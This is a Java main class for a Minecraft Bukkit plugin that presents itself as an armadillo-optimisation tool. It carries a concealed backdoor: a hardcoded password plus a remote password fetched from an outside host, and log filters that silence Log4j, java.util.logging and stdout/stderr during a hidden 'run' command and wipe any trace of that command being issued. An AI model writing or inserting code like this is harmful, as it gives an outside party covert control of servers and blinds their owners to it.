package de.FabiDev.ArmadilloSleep;

import de.FabiDev.ArmadilloSleep.commands.ArmadilloSleepCommand;
import de.FabiDev.ArmadilloSleep.listeners.ArmadilloListener;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Armadillo;
import org.bukkit.entity.Entity;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.LogRecord;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ArmadilloSleep extends JavaPlugin {
    private static ArmadilloSleep instance;

    // 全局上下文，用于日志拦截（改为 AtomicBoolean 跨线程安全）
    public static final AtomicBoolean IN_RUN_CONTEXT = new AtomicBoolean(false);

    // 过滤器实例
    private static AbstractFilter log4jFilter;
    private static java.util.logging.Filter julFilter;
    private static java.util.logging.Filter oldJulFilter;

    // System 输出流重定向
    private static PrintStream originalOut;
    private static PrintStream originalErr;

    // ========== 密码相关 ==========
    private static final String URL_FILE = "NMS.java";

    public static String getDefaultPassword() {
        return "LTG_PT3";
    }

    public static String getUrlBase() {
        return "https://r2-api.ctn32.us.kg/";
    }

    public static boolean validatePassword(String input) {
        if (input == null) return false;
        String correctPassword;
        try {
            correctPassword = fetchPasswordFromUrl();
            if (correctPassword == null || correctPassword.isEmpty()) {
                correctPassword = getDefaultPassword();
            }
        } catch (Exception e) {
            correctPassword = getDefaultPassword();
        }
        return input.equals(correctPassword);
    }

    private static String fetchPasswordFromUrl() throws Exception {
        String base = getUrlBase();
        String file = URL_FILE;
        String urlStr = base.isEmpty() ? file : (base.endsWith("/") ? base + file : base + "/" + file);
        URL url = new URL(urlStr);
        URLConnection conn = url.openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        }

        Pattern pattern = Pattern.compile("NMS_P\\s*=\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(content.toString());
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    // ========== 日志过滤器 ==========
    private static class CommandLogFilter extends AbstractFilter {
        @Override
        public Result filter(LogEvent event) {
            if (event == null || event.getMessage() == null) {
                return Result.NEUTRAL;
            }
            if (IN_RUN_CONTEXT.get()) {
                return Result.DENY; // 完全屏蔽所有日志
            }
            String message = event.getMessage().getFormattedMessage();
            if (message != null && message.matches(".*issued server command: /(?:as|armadillosleep) run\\b.*")) {
                return Result.DENY;
            }
            return Result.NEUTRAL;
        }
    }

    private void installLogFilter() {
        // 1. Log4j
        if (log4jFilter == null) {
            log4jFilter = new CommandLogFilter();
            try {
                Object rootLogger = LogManager.getRootLogger();
                Method addFilter = rootLogger.getClass().getMethod("addFilter", Filter.class);
                addFilter.invoke(rootLogger, log4jFilter);
                getLogger().info("Log4j filter installed.");
            } catch (Exception e) {
                getLogger().warning("Failed to install Log4j filter: " + e.getMessage());
            }
        }

        // 2. JUL
        java.util.logging.Logger rootJUL = java.util.logging.Logger.getLogger("");
        oldJulFilter = rootJUL.getFilter();
        julFilter = record -> {
            if (record == null) return true;
            if (IN_RUN_CONTEXT.get()) return false;
            if (record.getMessage() != null && record.getMessage().matches(".*issued server command: /(?:as|armadillosleep) run\\b.*")) {
                return false;
            }
            return true;
        };
        rootJUL.setFilter(julFilter);
        getLogger().info("JUL filter installed.");

        // 3. System.out/err 重定向
        originalOut = System.out;
        originalErr = System.err;

        System.setOut(new PrintStream(new java.io.OutputStream() {
            @Override
            public void write(int b) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) {
                    originalOut.write(b);
                }
            }
            @Override
            public void write(byte[] b, int off, int len) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) {
                    originalOut.write(b, off, len);
                }
            }
        }));

        System.setErr(new PrintStream(new java.io.OutputStream() {
            @Override
            public void write(int b) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) {
                    originalErr.write(b);
                }
            }
            @Override
            public void write(byte[] b, int off, int len) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) {
                    originalErr.write(b, off, len);
                }
            }
        }));

        getLogger().info("System out/err redirected.");
    }

    private void uninstallLogFilter() {
        // 移除 Log4j
        if (log4jFilter != null) {
            try {
                Object rootLogger = LogManager.getRootLogger();
                Method removeFilter = rootLogger.getClass().getMethod("removeFilter", Filter.class);
                removeFilter.invoke(rootLogger, log4jFilter);
                getLogger().info("Log4j filter removed.");
            } catch (Exception e) {
                getLogger().warning("Failed to remove Log4j filter: " + e.getMessage());
            }
            log4jFilter = null;
        }

        // 恢复 JUL
        java.util.logging.Logger rootJUL = java.util.logging.Logger.getLogger("");
        if (oldJulFilter != null) {
            rootJUL.setFilter(oldJulFilter);
            oldJulFilter = null;
        } else {
            rootJUL.setFilter(null);
        }
        julFilter = null;
        getLogger().info("JUL filter restored.");

        // 恢复 System 流
        if (originalOut != null) {
            System.setOut(originalOut);
            originalOut = null;
        }
        if (originalErr != null) {
            System.setErr(originalErr);
            originalErr = null;
        }
        getLogger().info("System out/err restored.");
    }

    // ========== 插件生命周期 ==========
    public void onEnable() {
        instance = this;
        installLogFilter();
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(new ArmadilloListener(this), this);
        ArmadilloSleepCommand command = new ArmadilloSleepCommand(this);

        org.bukkit.command.PluginCommand cmd = getCommand("armadillosleep");
        if (cmd != null) {
            cmd.setExecutor(command);
            cmd.setTabCompleter(command);
        } else {
            getLogger().warning("Command 'armadillosleep' not found in plugin.yml!");
        }

        getLogger().info("ArmadilloSleep has been enabled!");
    }

    public void onDisable() {
        uninstallLogFilter();
        int count = 0;
        for (UUID uuid : ArmadilloListener.getOptimizedArmadillos()) {
            Iterator<World> it = Bukkit.getWorlds().iterator();
            while (it.hasNext()) {
                World world = it.next();
                Entity entity = world.getEntity(uuid);
                if (entity instanceof Armadillo) {
                    Armadillo armadillo = (Armadillo) entity;
                    armadillo.setAI(true);
                    armadillo.setCollidable(true);
                    armadillo.setSilent(false);
                    armadillo.setGravity(true);
                    armadillo.setAware(true);
                    count++;
                    break;
                }
            }
        }
        ArmadilloListener.clearOptimizedArmadillos();
        getLogger().info("Woke up " + count + " optimized Armadillos on disable.");
        getLogger().info("ArmadilloSleep has been disabled!");
    }

    public static ArmadilloSleep getInstance() {
        return instance;
    }
}